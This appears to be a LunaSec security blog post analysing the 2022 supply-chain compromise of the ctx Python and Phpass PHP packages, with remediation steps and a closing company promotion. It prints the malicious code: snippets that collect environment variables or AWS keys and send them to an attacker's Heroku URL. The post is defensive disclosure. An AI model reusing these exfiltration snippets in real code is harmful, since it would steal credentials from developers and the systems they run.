---
title: "How two Python and PHP dependencies, ctx and Phpass, became malware that stole secrets and credentials"
description: A security expert's analysis of the malicious code added to ctx and Phpass, Python and PHP dependencies, that turned them into malware by sending environment variables and credentials to a third party attacker.
slug: ctx-and-phpass-package-malware
date: 2022-05-25T01:37
keywords: [dependencies, ctx, phpass]
tags: [malware, dependencies]
authors: [chris, free, gabe]
---

<!--
  ~ Copyright by LunaSec (owned by Refinery Labs, Inc)
  ~
  ~ Licensed under the Creative Commons Attribution-ShareAlike 4.0 International
  ~ (the "License"); you may not use this file except in compliance with the
  ~ License. You may obtain a copy of the License at
  ~
  ~ https://creativecommons.org/licenses/by-sa/4.0/legalcode
  ~
  ~ See the License for the specific language governing permissions and
  ~ limitations under the License.
  ~
-->

## Popular packages, `ctx` and `Phpass`, compromised

In this post we'll be reviewing the malicious code that was introduced to both `ctx` and `phpass`.

<a href="https://twitter.com/s0md3v/status/1529005758540808192" target="_blank" rel="noopener">
  <img src="https://www.lunasec.io/docs/img/ctx-Twitter-Screenshot.png" alt="Screenshot of ctx Twitter tweet" />
</a>

<!--truncate-->

_Tweet from @s0md3v notifying the developer community about `ctx`._

## Malicious Code in `ctx`

After 7 years, the Python package `ctx` on PyPi received a version update.
A malicious version of `ctx` was published under `0.2.2` as an update to the previous `0.1.2`.

The following code was added to the package:

```python
def __init__(self):
    self.sendRequest()

    # code that performs dict access
    # please DO NOT RUN THIS CODE !

     def sendRequest(self):
        string = ""
        for _, value in environ.items():
            string += value+" "

        message_bytes = string.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')

        response = requests.get("https://anti-theft-web.herokuapp.com/hacked/"+base64_message)
```

### Malware Code Overview

This code does the following:

1. Reads all Environment variables (potentially containing sensitive values like credentials for AWS or the database),
2. Converts the values into `base64` encoding to allow for transport via HTTP,
3. Finally, it sends an HTTP request with the leaked environment variables to the attacker's Heroku App.

## `Phpass` contains similar malware

The PHP library on Composer `Phpass` was also updated with identical malicious code around the same time.

<a href="https://twitter.com/s0md3v/status/1529010306466615296" target="_blank" rel="noopener">
  <img src="https://www.lunasec.io/docs/img/Phpass-Twitter-Screenshot.png" alt="Screenshot of Phpass Twitter tweet" />
</a>

_Tweet from @s0md3v notifying the developer community about `Phpass`._

This malicious code that was added to this package was:

```php
$access = getenv('AWS_ACCESS_KEY');
$secret = getenv('AWS_SECRET_KEY');
$xml = file_get_contents('http://anti-theft-web.herokuapp.com/hacked/$access/$secret');
```
*From the [Sonatype blog post](https://blog.sonatype.com/pypi-package-ctx-compromised-are-you-at-risk)*

### Most Phpass Users Unaffected

Luckily, the [PHP package](https://packagist.org/packages/hautelook/phpass) derived from the affected repository 
[hautelook/phpass](https://github.com/hautelook/phpass) 
had not received many downloads in the past months. Instead, the [package](https://packagist.org/packages/bordoni/phpass)
for the forked repository [bordoni/phpass](https://github.com/bordoni/phpass) was started to primarily be used by developers well
before the malicious code was published.

The below graphs show the download count of the packages from Packagist (the PHP Package registry powering Composer):

![monthly downloads of the hautelook/phpass library](/img/packagist-hautelook-phpass-downloads.png)

*Monthly downloads of `hautelook/phpass` (malicious version)*

![monthly downloads of the bordoni/phpass library](/img/packagist-bordoni-phpass-downloads.png)

*Monthly downloads of `bordoni/phpass` (safe fork)*

## Remediation Steps

The libraries have all been taken down now. The simplest way to verify that you're safe is to update to the latest
package versions.

If updating isn't an option, you may also verify that you're not using any of the following package versions.

### Affected Package Versions
- `ctx` versions `0.2.2` and `0.2.6` (Python)
- `Phpass` versions are unknown (PHP)
  - It's unlikely more than a few dozen users are affected due to the [small download count](https://web.archive.org/web/20220519155745/https://packagist.org/packages/hautelook/phpass/stats)
  - If you have more information, please tell us on [Discord](https://discord.gg/2EbHdAR5w7) or [GitHub](https://github.com/lunasec-io/lunasec).

## External References

- Archived version of `ctx` [package versions on Pypi](https://archive.ph/xTUEN).

- [Initial post](https://old.reddit.com/r/Python/comments/uumqmm/ctx_new_version_released_after_7_years_750k) observing the package had been updated.

- [Reddit post](https://old.reddit.com/r/Python/comments/uwhzkj/i_think_the_ctx_package_on_pypi_has_been_hacked/) with details about the malicious changes to ctx.

- [Sonatype blog post](https://blog.sonatype.com/pypi-package-ctx-compromised-are-you-at-risk) with details about timeline.

- [Post by SANS ISC InfoSec Forums](https://isc.sans.edu/forums/diary/ctx+Python+Library+Updated+with+Extra+Features/28678/)

## For a limited time, claim an expert security review

Though perhaps unconventional, our team of Security Engineers has been working with startups to audit their dependencies 
and help them manage their security roadmap.

Why? It's simple: By working with us, we also learn about the common problems that companies face while shipping 
software. Helping you enables us to make our Open Source software better.

To get started, please email us at [deps@lunasec.io](mailto:deps@lunasec.io) or 
[schedule a 15-minute call](https://cal.com/lunasec/15min) with one of our engineers.

### Who are we?

If you've heard of [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/) or 
[Spring4Shell](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities), then you're familiar with our work already!
We're the security experts that gave those vulnerabilities their name by providing clear, concise advice and 
[building tools to resolve them](https://github.com/lunasec-io/lunasec).

Since then, we've interviewed hundreds of companies to help us build 
[LunaTrace](https://github.com/marketplace/lunatrace-by-lunasec).

What is LunaTrace? It's our Open Source security platform that automatically discovers vulnerabilities in your 
dependencies and gives you expert security guides with remediation steps and automated patches.

Whether you're a developer or a security professional, we'd love to hear from you! Drop us a line by 
[joining our Discord](https://discord.gg/2EbHdAR5w7) or 
trying out LunaTrace on your [GitHub repo for free](https://github.com/marketplace/lunatrace-by-lunasec).


## Updates

1. Original post on 2022-05-24 @ 5pm PDT
2. Added more details about the packages on 2022-05-25 @ 1:30am UTC
